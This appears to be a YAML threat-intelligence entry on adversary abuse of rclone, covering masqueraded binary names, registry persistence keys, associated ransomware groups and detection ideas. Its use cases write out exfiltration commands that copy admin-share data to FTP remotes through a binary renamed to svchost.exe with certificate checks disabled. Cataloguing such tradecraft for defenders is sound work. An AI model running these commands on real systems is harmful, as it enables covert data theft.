Name: rclone
Aliases:
  - rclone.exe
Description: >
  rclone is a command-line program for managing files on cloud storage. It supports over 40 cloud storage providers
  and enables syncing, copying, and transferring data. Adversaries abuse rclone to exfiltrate data due to its ability
  to interface with cloud storage and run in stealth using custom configurations and renamed binaries.
Category: third-party
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - cli
  - script
Capabilities:
  - file-sync
  - encrypted-transfer
  - cloud-sync
  - background-execution
  - stealth-upload
  - direct-to-cloud
  - protocol-tunneling
  - encrypted-transfer
  - proxy-support
  - scriptable-execution

Forensics:
  FileNamePatterns:
    - rclone.exe
    - rclone64.exe
    - svchost.exe        # Common masqueraded name
    - sihost.exe         # Common masqueraded name
    - rundll32.exe       # Also used in some renamed payloads
  BinaryLocations:
    - C:\Users\<user>\rclone.exe
    - /usr/bin/rclone
  RegistryPersistence:
    - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rclone_service'
    - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\rclone_updater'
  LogFiles:
    - 'C:\Users\<username>\AppData\Local\rclone\rclone.log'
    - '%TEMP%\rclone-activity.log'
    - '/var/log/rclone.log'
  CommandLineArgs:
    - copy
    - sync
    - --config
    - --ignore-existing
    - --auto-confirm
    - --multi-thread-streams
    - --transfers
    - --progress
    - --no-check-certificate
  NetworkArtifacts:
    - TLS connections to cloud endpoints
    - FTP uploads
    - Multiple file upload events
  ConfigFiles:
    - C:\Users\<username>\AppData\Roaming\rclone\rclone.conf
    - ~/.config/rclone/rclone.conf
  ScheduledTask: []
ThreatActors:
  - REvil
  - Quantum
  - Akira
  - Conti

UseCases:
  - Title: Standard cloud upload
    Description: Upload a directory to remote cloud storage using default config.
    Command: rclone copy /data remote:backup

  - Title: Masqueraded exfiltration with custom config
    Description: Masqueraded rclone binary used with renamed config to perform exfiltration.
    Command: |
      svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\Server\C$\Share" ftp1:/domain/share

  - Title: Ransomware-style exfiltration with filtering
    Description: Copy data while excluding file types and using multiple threads to speed up the upload.
    Command: |
      rclone.exe copy --max-age 5y "\\BACKUP\E:\" remote:Groups --exclude "*.{psd,rar,zip}"
      --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P

  - Title: FTP exfiltration with minimal footprint
    Description: Send data to an FTP server while skipping known extensions and logging minimal output.
    Command: |
      rclone copy \\192.168.1.100\f$ st:"/home/user/data" --max-age 1y
      --exclude "*.{iso,exe,zip}" --ignore-existing --auto-confirm -q --transfers 5 -P
Detection:
  - Type: Suspicious Parent Process
    Description: Detect execution of rclone.exe with uncommon or suspicious parent processes (e.g., powershell.exe, wscript.exe, office applications, OneNote, WMIC).

  - Type: Masquerading Detection
    Description: Alert when rclone is renamed to common system binaries (e.g., svchost.exe) but shows rclone-related flags in command-line (e.g., --config, copy, sync).

  - Type: WebDAV/FTP Exfiltration
    Description: Monitor for rclone activity over non-standard protocols (e.g., FTP, WebDAV). Rclone used in Egregor and others to exfiltrate via these channels.

  - Type: Large Data Transfer
    Description: Correlate rclone execution with high bytes_out in a short timeframe, indicating bulk exfiltration after archive creation.

  - Type: Scheduled Task or Registry Persistence
    Description: Check for creation of scheduled tasks or registry Run keys that execute rclone (e.g., via svchost.exe masquerade).
